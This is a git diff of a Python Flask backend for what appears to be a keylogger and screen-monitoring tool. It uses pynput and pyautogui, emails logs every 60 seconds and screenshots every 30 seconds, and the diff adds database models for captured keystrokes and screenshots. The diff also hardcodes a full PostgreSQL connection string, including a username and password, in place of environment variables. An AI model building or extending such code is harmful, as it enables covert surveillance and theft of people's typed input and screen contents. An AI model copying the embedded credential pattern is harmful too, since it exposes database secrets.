@@ -3,39 +3,39 @@ import time
 import os
 import pyautogui
 import smtplib
-import psycopg2
 import pynput
 import jwt
 import json
 import mimetypes
-import shutil
+from sqlalchemy import text
 import zipfile
-from pynput.keyboard import Listener
 from dotenv import load_dotenv
 from flask_cors import CORS
 from email.message import EmailMessage
 from flask import Flask, request, jsonify, send_from_directory,  send_file
+from flask_sqlalchemy import SQLAlchemy
 
 
 CLERK_JWT_PUBLIC_KEY = os.getenv("CLERK_JWT_PUBLIC_KEY")
 CLERK_API_URL = "https://api.clerk.dev/v1"
 
 
+# loading vars and so
 load_dotenv()
 CONFIG_FILE = "config.json"
 
+
+#app and cors setup
 app = Flask(__name__)
 CORS(app)
 
-# Database Connection
-def get_db_connection():
-    return psycopg2.connect(
-        dbname=os.getenv("DB_NAME"),
-        user=os.getenv("DB_USER"),
-        password=os.getenv("DB_PASS"),
-        host=os.getenv("DB_HOST"),
-        port=os.getenv("DB_PORT")
-    )
+
+app.config["SQLALCHEMY_DATABASE_URI"] = "postgresql://neondb_owner:npg_WpoSvn9gtdE8@ep-broad-frog-a1ekybq7-pooler.ap-southeast-1.aws.neon.tech/neondb?sslmode=require"
+app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
+
+
+db = SQLAlchemy(app)
+
 
 # Email Configuration
 SMTP_SERVER = "smtp.gmail.com"
@@ -45,6 +45,7 @@ sender_password = os.getenv("SENDER_PASSWORD")
 reciever_mail = os.getenv("RECIEVER_EMAIL")
 email_interval = 60
 screenshot_interval = 30
+
 
 # Monitoring Variables
 monitoring = False
@@ -318,6 +319,30 @@ def download_logs():
 
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+    
+
+class Keylog(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
+    keystrokes = db.Column(db.Text, nullable=False)
+
+
+
+class Screenshot(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
+    image_data = db.Column(db.LargeBinary, nullable=False)
+
+
+
+with app.app_context():
+    try:
+        db.session.execute(text("SELECT 1 FROM keylog LIMIT 1;"))
+        db.session.execute(text("SELECT 1 FROM screenshot LIMIT 1;"))
+        print("✅ Connected to NeonDB. Tables exist.")
+    except Exception as e:
+        print(f"❌ Database Error: {e}")
+
 
 if __name__ == "__main__":
     ensure_directories()
